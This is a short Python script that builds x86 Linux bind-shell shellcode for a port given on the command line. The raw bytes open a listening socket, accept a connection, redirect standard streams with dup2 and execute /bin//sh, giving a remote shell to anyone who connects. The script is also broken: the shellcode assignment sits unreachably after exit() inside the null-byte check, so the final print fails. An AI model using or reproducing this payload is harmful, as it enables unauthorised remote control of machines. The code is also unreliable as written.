#!/usr/bin/env python3
import sys
import struct
from sys import argv

port = int(argv[1])
print(" Warning : for port num < 1024 please exec as root")

if port > 65535 :
    print("port > 65535, please provide null free port")
    exit()

port = struct.pack("!H", port)
port = ("{}".format(''.join('\\x{:02x}'.format(b) for b in port)))

if "\\x00" in port:
    print(" warning : NULL  byte detected! choose different port and rerun")
    exit()

    finalshellcode = """\\x31\\xd2\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x5b\\x52\\x66\\x68%s\\x66\\x53\\x89\\xe7\\x6a\\x10\\x57\\x56\\x89\\xe1\\xcd\\x80\\x6a\\x66\\x58\\x31\\xdb\\xb3\\x04\\x52\\x56\\x89\\xe1\\xcd\\x80\\x6a\\x66\\x58\\x43\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80""" % (port)
print("shellcode : ",finalshellcode)
